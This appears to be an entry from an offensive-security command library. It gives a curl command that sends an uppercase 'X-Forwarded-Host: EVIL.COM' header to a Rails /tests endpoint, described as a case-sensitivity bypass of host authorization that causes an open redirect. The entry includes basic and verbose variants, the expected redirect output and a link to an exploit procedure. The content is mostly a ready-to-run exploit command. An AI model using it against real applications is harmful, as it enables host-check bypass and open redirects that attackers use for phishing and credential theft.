---
id: uuid-curl-upper
data: 'curl ''http://localhost:3000/tests'' -H ''X-Forwarded-Host: EVIL.COM'''
tags:
  - http-test
  - header-bypass
  - open-redirect
type: command
output: >-
  <html><body>You are being <a
  href="http://EVIL.COM/">redirected</a>.</body></html>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.608Z'
verified: false
validated: true
submitted: true
---
# curl-uppercase-x-forwarded-host

## Command

```bash
curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: EVIL.COM'
```

## Description

Executes a GET request to the Rails /tests endpoint using an all-uppercase X-Forwarded-Host header to exploit the case-sensitivity bypass in host authorization, leading to an open redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (e.g., 'http://localhost:3000/tests') | Target redirect endpoint | Yes |
| -H 'X-Forwarded-Host: EVIL.COM' | Uppercase header triggering nil forwarded_host | Yes |

## Examples

### Basic Usage

```bash
curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: EVIL.COM'
```

### Advanced Usage (With Verbose Output)

```bash
curl -v 'http://localhost:3000/tests' -H 'X-Forwarded-Host: EVIL.COM'
```

## Expected Output

Redirect HTML: <html><body>You are being <a href="http://EVIL.COM/">redirected</a>.</body></html>. Look for 302 status and unauthorized Location in verbose logs.

## Related

- [[commands/curl-mixed-case-x-forwarded-host]]
- [[procedures/Exploit-Open-Redirect-with-Uppercase-X-Forwarded-Host]]
